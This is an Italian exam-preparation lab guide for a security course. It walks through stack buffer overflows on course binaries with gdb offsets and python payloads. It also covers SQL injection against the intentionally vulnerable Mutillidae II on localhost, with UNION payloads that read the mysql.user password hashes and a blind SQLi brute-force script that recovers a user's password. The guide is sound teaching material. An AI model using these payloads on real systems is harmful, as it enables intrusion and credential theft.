# Simulazione di prova d’esame – **Guida passo‑passo**

Questa guida raccoglie gli appunti di laboratorio (Buffer Overflow + SQL Injection) in forma **tutoriale**: ogni esercizio indica *perché* si fa un’operazione, *cosa* aspettarsi in output e *come* ragionare per arrivare alla soluzione.

> **Target studenti** – chi sta preparando l’esame di *Sicurezza Informatica* e vuole un filo logico da seguire.

---

## 0 · Prerequisiti

| Strumento         | Versione minima | Nota                          |
| ----------------- | --------------- | ----------------------------- |
| **Debian VM**     | 11 (i686)       | fornita dal corso             |
| **gcc**           | 9.x             | compilazione 32 bit, *no‑pie* |
| **gdb**           | qualunque       | debug di binari x86           |
| **Python 3**      | 3.8             | per gli script SQLi Blind     |
| **requests**      | 2.x             | `pip install requests`        |
| **Mutillidae II** | 2.6.46          | già nella VM                  |

### Flag di compilazione per i binari overflow

```bash
gcc -w -m32 -fno-stack-protector -fno-pic -no-pie -g -o <out> <src>.c
```

* Stack canary disabilitato, **ASLR** da disabilitare in `/proc/sys/kernel/randomize_va_space` se serve.\*

---

## 1 · Buffer Overflow (cartella `BufferOverflow`)

> Scaricare i binari extra:
>
> ```bash
> wget https://secloud.ing.unimore.it/shared/si/buff_over_extra.tgz
> tar xzf buff_over_extra.tgz
> ```

### 1.1 – Calcolare la lunghezza minima che causa crash (`es1`)

| 📝 | Concetto chiave                                                                            |
| -- | ------------------------------------------------------------------------------------------ |
| 1  | La dimensione del buffer è data dal valore sottratto da `esp` (`sub $0xaac4,%esp`).        |
| 2  | A runtime vogliamo la *distanza* fra **buffer start (EAX)** e **EBP** salvato sullo stack. |

```gdb
(gdb) disass main               # notiamo sub $0xaac4,%esp
(gdb) b *main+30                # subito dopo la call a gets
(gdb) run
(gdb) i r eax ebp
```

Calcolo:

```text
0xFFFFD5D8 (EBP)
-0xFFFF2B17 (EAX)  = 0xAAA1   => 43 713 byte
```

Il programma *segfaulta* a `43 709` byte (4 byte prima) perché sovrascriviamo il vecchio `ECX` salvato.

**Comando di test**

```bash
python -c 'print("A"*43709)' | ./es1    # segmentation fault
```

---

### 1.2 – Sovrascrivere `topolino` (`es2`)

**Obiettivo**: portare la variabile `topolino` (a `ebp‑0x0c`) al valore `0x7A525851` (zinco‑R‑X‑Q).

1. **Trova offset**

   ```gdb
   (gdb) disass main   # segue linea con cmpl $0x7a525851,-0xc(%ebp)
   (gdb) b *main+37    # subito dopo gets
   (gdb) i r eax ebp   # eax = &buffer, ebp = fp
   ```

   Offset = `ebp - 0x0c - eax` = **45 B**.
2. **Costruisci payload**

   ```bash
   python - <<'PY'
   print("A"*45 + "\x51\x58\x52\x7a", end='')
   PY | ./es2
   # → Ottimo! Hai modificato correttamente la variabile
   ```

---

### 1.3 – Sovrascrivere `pluto` (`es3`)

* Valore richiesto: `0x00745962`.
* Offset calcolato da GDB: **376 B**.

```bash
python -c 'print("A"*376 + "\x62\x59\x74\x00")' | ./es3
```

---

### 1.4 – Deviare il flusso su `nascosta()` (`es4`)

* Indirizzo `nascosta` = `0x0804846b`.
* Variabile puntatore è a `ebp‑0x0c`; calcoliamo offset ≈ **82 264 B**.

```bash
python -c 'print("A"*82264 + "\x6b\x84\x04\x08")' | ./es4
```

Output: *Hai modificato correttamente il flusso di esecuzione*.

### 1.5 – Funzione `impossibile`

Analogo procedimento: trovare l’indirizzo della funzione, il nuovo offset e sovrascrivere.

---

## 2 · SQL Injection (cartella `SQLInjection`)

* **URL base**: `http://127.0.0.1/mutillidae/index.php?page=login.php`
* **Tecnicismi**: Mutillidae usa MariaDB; `#` è commento in MySQL; la pagina ha 7 colonne nella `SELECT`.

### 2.1 – Versione DB e utente in esecuzione

```sql
' UNION SELECT 1,VERSION(),CURRENT_USER(),4,5,6,7 #
```

Risultato → `10.1.23-MariaDB` / `root@localhost`.

### 2.2 – Cercare un video YouTube

1. Trova tabella con `information_schema.tables` (`youTubeVideos`).
2. Trova colonne (`recordIndetifier`, `identificationToken`, `title`).
3. Query finale (nessun match per token `1lblqC2Favk`).

### 2.3 – Estrarre credenziali utente `root`

```sql
' UNION SELECT Host,User,Password,'x','x','x','x' FROM mysql.user #
```

Password hash SHA‑1: `*2470C0C0…`  —  `password_expired = 'N'`.

### 2.4 – Colonne della tabella `hitlog`

```sql
' UNION SELECT 1,table_name,column_name,4,5,6,7 FROM information_schema.columns WHERE table_name='hitlog' #
```

Restituisce: `cid`, `hostname`, `ip`, `browser`, `referer`, `date`.

---

### 2.5 – Blind SQLi sull’utente `simba`

#### Idea generale

* **Login riuscito** → pagina più corta (banner *Logged In User*).
* Confrontiamo `len(r.text)` con la *baseline* di login fallito.

#### Query template

```sql
simba' AND
(
  SUBSTRING(
      (
         SELECT password
           FROM accounts
          WHERE username='simba'
            AND LENGTH(password)=8
      ),
      1,      -- posizione corrente
      1       -- un solo carattere
  ) = 'X'     -- prova ogni char dell'alfabeto
) #
```

Quando il carattere è corretto, la clausola è vera e la risposta cambia.

#### Script di automazione (`blind_bruteforce.py`)

*Calcola la baseline, trova la lunghezza, poi ricostruisce la password un byte alla volta.*

```bash
python blind_bruteforce.py \
  -U http://127.0.0.1/mutillidae/index.php?page=login.php \
  -u simba -v
```

Output:

```
Password length 8 matched!
Actually matched prefix: p
...
Password for 'simba': password
```

Password verificata con l’interfaccia Mutillidae.

---

## 3 · Domande frequenti

| Domanda                                           | Risposta breve                                                                           |                                                  |
| ------------------------------------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------ |
| **Perché usare `#` come commento?**               | È il simbolo di commento a riga singola in MySQL/MariaDB.                                |                                                  |
| **Perché `LIMIT 1` nelle sub‑query?**             | Evita errori se esistono più omonimi (`username='simba'`).                               |                                                  |
| **Perché invertire i byte nei payload overflow?** | La CPU x86 è little‑endian: il valore deve essere scritto in ordine inverso (LSB → MSB). |                                                  |
| **Come disabilito ASLR?**                         | \`echo 0                                                                                 | sudo tee /proc/sys/kernel/randomize\_va\_space\` |

---

## Riferimenti utili

* OWASP Mutillidae II – [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)
* Aleph One – *Smashing the Stack for Fun and Profit*
* MariaDB Documentation – *String Functions / SUBSTRING()*
* GDB Cheat‑Sheet
